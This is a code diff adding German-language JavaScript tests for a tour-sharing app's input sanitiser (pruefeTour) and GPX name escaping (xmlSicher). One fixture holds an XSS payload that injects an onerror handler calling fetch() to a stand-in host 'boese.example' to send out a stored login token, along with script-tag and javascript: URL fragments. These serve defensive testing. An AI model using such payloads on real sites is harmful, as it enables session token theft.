@@ -216,3 +216,107 @@ sucheRundtour(start, 120, profil, melde).then(function (ergebnis) {
 // jsc arbeitet die Promise-Warteschlange nicht von allein ab, bevor das
 // Skript endet. Im Browser passiert das von selbst.
 if (typeof drainMicrotasks === 'function') drainMicrotasks();
+
+
+/* ---------------------------------------------------------------------------
+   pruefeTour() - was vom Server kommt, ist erst einmal fremd.
+
+   Diese Faelle sind der Grund, warum es die Funktion gibt: Sobald Routen
+   geteilt werden, ist der Inhalt einer Tour eine Zuschrift von einem Fremden.
+   Siehe SICHERHEIT.md, Befund B1.                                          */
+
+function prüfeFall(beschreibung, bedingung) {
+  if (!bedingung) print('FEHLER: ' + beschreibung);
+}
+
+// --- Der Angriff, um den es eigentlich geht -------------------------------
+(function () {
+  const angriff = {
+    id: 'x',
+    name: 'Harmlos',
+    waypoints: [{ lat: 52.5, lon: 13.4 }],
+    // Ein Feld, das die App gar nicht kennt, mit HTML darin.
+    bild: 'data:x" onerror="fetch(\'https://boese.example/?d=\'+localStorage.getItem(\'token\'))',
+    fotos: [{ id: '"><script>', bild: 'javascript:alert(1)' }],
+  };
+  const sauber = pruefeTour(angriff);
+  prüfeFall('Angriff wird angenommen, aber entkernt', sauber !== null);
+  prüfeFall('das erfundene Feld "bild" faellt weg', sauber.bild === undefined);
+  prüfeFall('das erfundene Feld "fotos" faellt weg', sauber.fotos === undefined);
+  prüfeFall('nur die bekannten Felder bleiben uebrig',
+    Object.keys(sauber).sort().join(',') === 'id,name,track,waypoints');
+})();
+
+// --- Unbrauchbares wird abgewiesen statt repariert -------------------------
+prüfeFall('null wird abgewiesen', pruefeTour(null) === null);
+prüfeFall('eine Zeichenkette wird abgewiesen', pruefeTour('kaputt') === null);
+prüfeFall('ein Feld wird abgewiesen', pruefeTour([1, 2, 3]) === null);
+prüfeFall('ohne id wird abgewiesen',
+  pruefeTour({ waypoints: [{ lat: 1, lon: 2 }] }) === null);
+prüfeFall('ohne einen einzigen gueltigen Punkt wird abgewiesen',
+  pruefeTour({ id: 'a', waypoints: ['x'], track: [] }) === null);
+
+// --- Zahlen, die keine sind ------------------------------------------------
+(function () {
+  const t = pruefeTour({
+    id: 'a',
+    waypoints: [
+      { lat: 52.5, lon: 13.4 },      // gut
+      { lat: 'x', lon: 13.4 },       // Text statt Zahl
+      { lat: 91, lon: 13.4 },        // ausserhalb des Bereichs
+      { lat: NaN, lon: 13.4 },       // keine Zahl
+      { lat: Infinity, lon: 13.4 },  // unendlich
+      { lat: 48.1, lon: 11.6 },      // gut
+    ],
+  });
+  prüfeFall('nur die zwei gueltigen Punkte bleiben', t.waypoints.length === 2);
+  prüfeFall('ein Punkt traegt nur lat und lon',
+    Object.keys(t.waypoints[0]).sort().join(',') === 'lat,lon');
+})();
+
+// --- Laengen werden gedeckelt ---------------------------------------------
+(function () {
+  const langerName = 'A'.repeat(500);
+  const t = pruefeTour({ id: 'a', name: langerName, waypoints: [{ lat: 1, lon: 2 }] });
+  prüfeFall('der Name wird gekuerzt', t.name.length === 120);
+
+  const vielePunkte = [];
+  for (let i = 0; i < 25000; i++) vielePunkte.push({ lat: 50, lon: 10 });
+  const t2 = pruefeTour({ id: 'a', track: vielePunkte });
+  prüfeFall('die Streckenpunkte werden gedeckelt', t2.track.length === 20000);
+})();
+
+// --- Was gut ist, kommt unveraendert durch --------------------------------
+(function () {
+  const echt = {
+    id: 'tour-1', name: 'Harz-Runde',
+    waypoints: [{ lat: 51.8, lon: 10.6 }, { lat: 51.9, lon: 10.7 }],
+    track: [{ lat: 51.8, lon: 10.6 }],
+    distance: 12345, curviness: 280, aufgezeichnet: true,
+  };
+  const t = pruefeTour(echt);
+  prüfeFall('Name bleibt', t.name === 'Harz-Runde');
+  prüfeFall('Wegpunkte bleiben', t.waypoints.length === 2);
+  prüfeFall('Entfernung bleibt', t.distance === 12345);
+  prüfeFall('Kurvigkeit bleibt', t.curviness === 280);
+  prüfeFall('aufgezeichnet bleibt', t.aufgezeichnet === true);
+})();
+
+
+/* --- xmlSicher(): der Tourname darf die GPX-Datei nicht sprengen ---------- */
+prüfeFall('kaufmaennisches Und wird ersetzt',
+  xmlSicher('Eifel & Mosel') === 'Eifel &amp; Mosel');
+prüfeFall('spitze Klammern werden ersetzt',
+  xmlSicher('<trk>') === '&lt;trk&gt;');
+prüfeFall('Anfuehrungszeichen werden ersetzt',
+  xmlSicher('Der "gute" Weg') === 'Der &quot;gute&quot; Weg');
+prüfeFall('null wird zu leerem Text', xmlSicher(null) === '');
+prüfeFall('normaler Name bleibt unveraendert',
+  xmlSicher('Harz-Runde') === 'Harz-Runde');
+(function () {
+  const gpx = baueGpx([[10.5, 51.8, 300]], 'Eifel & <Mosel>');
+  prüfeFall('die fertige GPX-Datei enthaelt kein nacktes Und',
+    !/&(?!amp;|lt;|gt;|quot;|apos;)/.test(gpx));
+  prüfeFall('der Name steht maskiert in der Datei',
+    gpx.indexOf('Eifel &amp; &lt;Mosel&gt;') > -1);
+})();
